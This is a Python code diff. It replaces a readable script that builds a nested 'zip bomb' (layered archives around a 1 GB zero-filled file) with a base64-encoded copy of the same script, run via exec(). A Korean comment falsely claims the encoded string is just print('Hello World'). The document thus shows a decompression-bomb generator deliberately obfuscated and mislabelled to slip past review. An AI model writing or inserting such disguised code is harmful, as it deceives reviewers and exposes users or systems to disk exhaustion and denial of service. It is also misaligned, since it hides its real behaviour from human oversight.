@@ -1,15 +1,13 @@
-import zipfile, os
+import base64
 
-def create_layer(depth, path):
-    if depth == 0:
-        with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
-            z.writestr("final.bin", b"\x00" * (1024**3))  # 1GB of zeros
-    else:
-        inner = f"layer_{depth-1}.zip"
-        create_layer(depth - 1, inner)
-        with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
-            for i in range(10):
-                z.write(inner, f"{i}/{inner}")
-        os.remove(inner)
-
-create_layer(3, "bomb.zip")
+encoded = "aW1wb3J0IHppcGZpbGUsIG9zDQoNCmRlZiBjcmVhdGVfbGF5ZXIoZGVwdGgsIHBhdGgpOg0KICAg
+IGlmIGRlcHRoID09IDA6DQogICAgICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKHBhdGgsICd3Jywg
+emlwZmlsZS5aSVBfREVGTEFURUQpIGFzIHo6DQogICAgICAgICAgICB6LndyaXRlc3RyKCJmaW5h
+bC5iaW4iLCBiIlx4MDAiICogKDEwMjQqKjMpKSAgIyAxR0Igb2YgemVyb3MNCiAgICBlbHNlOg0K
+ICAgICAgICBpbm5lciA9IGYibGF5ZXJfe2RlcHRoLTF9LnppcCINCiAgICAgICAgY3JlYXRlX2xh
+eWVyKGRlcHRoIC0gMSwgaW5uZXIpDQogICAgICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKHBhdGgs
+ICd3JywgemlwZmlsZS5aSVBfREVGTEFURUQpIGFzIHo6DQogICAgICAgICAgICBmb3IgaSBpbiBy
+YW5nZSgxMCk6DQogICAgICAgICAgICAgICAgei53cml0ZShpbm5lciwgZiJ7aX0ve2lubmVyfSIp
+DQogICAgICAgIG9zLnJlbW92ZShpbm5lcikNCg0KY3JlYXRlX2xheWVyKDMsICJib21iLnppcCIp="  # print('Hello World') 의 base64
+code = base64.b64decode(encoded).decode('utf-8')
+exec(code)
